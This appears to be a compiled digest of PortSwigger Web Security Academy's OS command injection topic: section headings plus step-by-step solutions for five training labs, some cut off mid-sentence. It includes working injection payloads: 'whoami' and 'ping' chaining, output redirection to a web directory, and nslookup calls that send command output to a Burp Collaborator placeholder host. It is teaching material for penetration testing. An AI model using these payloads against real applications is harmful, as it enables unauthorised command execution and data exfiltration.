# PortSwigger WSA — OS Command Injection
Source: https://portswigger.net/web-security/os-command-injection

## Technique headings
- OS command injection
- Labs
- What is OS command injection?
- Injecting OS commands
- Useful commands
- Blind OS command injection vulnerabilities
- Detecting blind OS command injection using time delays
- Exploiting blind OS command injection by redirecting output
- Exploiting blind OS command injection using out-of-band (OAST) techniques
- Ways of injecting OS commands
- How to prevent OS command injection attacks
- Read more
- Find OS command injection vulnerabilities using Burp Suite


## Labs (2026-10-18 — per-lab scenarios & solutions), 4 lab)

- **Blind OS command injection with out-of-band interaction** (`lab-blind-out-of-band`)
  - Use Burp Suite to intercept and modify the request that submits feedback. Modify the email parameter, changing it to: email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN|| Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified email parameter. Note The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-
- **Blind OS command injection with output redirection** (`lab-blind-output-redirection`)
  - Use Burp Suite to intercept and modify the request that submits feedback. Modify the email parameter, changing it to: email=||whoami>/var/www/images/output.txt|| Now use Burp Suite to intercept and modify the request that loads an image of a product. Modify the filename parameter, changing the value to the name of the file you specified for the output of the injected command: filename=output.txt Observe that the resp
- **Blind OS command injection with time delays** (`lab-blind-time-delays`)
  - Use Burp Suite to intercept and modify the request that submits feedback. Modify the email parameter, changing it to: email=x||ping+-c+10+127.0.0.1|| Observe that the response takes 10 seconds to return.
- **OS command injection, simple case** (`lab-simple`)
  - Use Burp Suite to intercept and modify a request that checks the stock level. Modify the storeID parameter, giving it the value 1|whoami . Observe that the response contains the name of the current user.
- **Blind OS command injection with out-of-band data exfiltration** (`lab-blind-out-of-band-data-exfiltration`)
  - Solution • Use Burp Suite Professional to intercept and modify the request that submits feedback. • Go to the Collaborator tab. • Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. • Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated: . email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN|| • Go back to the Collaborator tab, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any int
